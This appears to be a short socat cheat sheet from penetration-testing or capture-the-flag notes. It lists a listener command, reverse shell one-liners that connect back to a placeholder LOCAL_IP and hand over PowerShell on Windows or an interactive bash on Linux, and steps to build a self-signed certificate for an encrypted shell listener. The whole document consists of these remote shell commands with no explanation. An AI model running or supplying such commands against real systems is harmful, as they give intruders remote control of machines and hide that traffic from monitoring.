# SOCAT

### Setup listener: socat TCP-L:PORT -

### Windows: socat TCP:LOCAL_IP:LOCAL_PORT EXEC:powershell.exe,pipes

### Linux: socat TCP:LOCAL_IP:LOCAL_PORT EXEC:"bash -li"

## Encrypted shells

### 1) openssl req --newkey rsa:2048 -nodes -keyout SHELL.KEY -x509 -days 362 -out SHELL.CRT

### 2) cat SHELL.KEY SHELL.CRT > SHELL.PEM

### 3) socat OPENSSL-LISTEN:PORT,cert=SHELL.PEM,verify=0 -
